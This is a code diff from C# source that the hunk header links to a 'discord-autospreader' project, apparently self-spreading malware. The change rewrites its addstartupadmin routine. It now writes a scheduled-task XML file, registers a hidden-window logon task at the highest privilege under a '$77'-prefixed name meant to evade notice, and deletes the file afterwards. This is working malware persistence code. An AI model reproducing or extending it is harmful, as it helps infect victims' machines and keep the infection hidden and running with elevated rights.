@@ -320,21 +320,55 @@ heres the source: https://github.com/moom825/discord-autospreader . You should b
         }
         public static void addstartupadmin() 
         {
-            string x = String.Format("/create /tn \"{1}\" /tr \"'{0}'\" /sc onlogon /rl HIGHEST", System.Reflection.Assembly.GetEntryAssembly().Location, "$77" + Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location));
-            var p = new Process
+            string xmlpath = $"{Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)}\\temp.xml";
+            File.WriteAllText(xmlpath,
+@"<?xml version=""1.0"" encoding=""UTF-16""?>
+<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+    </LogonTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id=""Author"">
+      <LogonType>InteractiveToken</LogonType>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
+    <AllowHardTerminate>false</AllowHardTerminate>
+    <StartWhenAvailable>false</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>true</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>false</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context=""Author"">
+    <Exec>
+      <Command>" + Assembly.GetEntryAssembly().Location + @"</Command>
+    </Exec>
+  </Actions>
+</Task>");
+            Process.Start(new ProcessStartInfo()
             {
-                StartInfo =
-                {
-                    UseShellExecute = false,
-                    FileName = "SCHTASKS.exe",
-                    RedirectStandardError = true,
-                    RedirectStandardOutput = true,
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    Arguments = x
-                }
-            };
-            p.Start();
+                FileName = "schtasks.exe",
+                Arguments = $"schtasks /create /tn \"$77{Path.GetFileName(Assembly.GetEntryAssembly().Location)}\" /xml {xmlpath}",
+                WindowStyle = ProcessWindowStyle.Hidden,
+                UseShellExecute = false
+
+            }).WaitForExit();
+            File.Delete(xmlpath);
         }
         public static void copyappdata() 
         {
